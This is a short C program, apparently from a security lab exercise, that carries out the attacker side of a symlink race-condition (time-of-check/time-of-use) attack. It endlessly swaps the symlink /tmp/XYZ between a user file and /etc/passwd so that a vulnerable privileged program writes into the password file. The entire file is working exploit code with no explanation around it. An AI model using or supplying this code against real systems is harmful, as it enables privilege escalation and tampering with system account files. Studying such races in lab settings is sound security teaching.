#include <unistd.h>

int main()
{
    while(1)
    {
        unlink("/tmp/XYZ");
        symlink("/my_home_path/passwd_input", "/tmp/XYZ");
        usleep(10000);

        unlink("/tmp/XYZ");
        symlink("/etc/passwd", "/tmp/XYZ");
        usleep(10000);
    }

    return 0;
}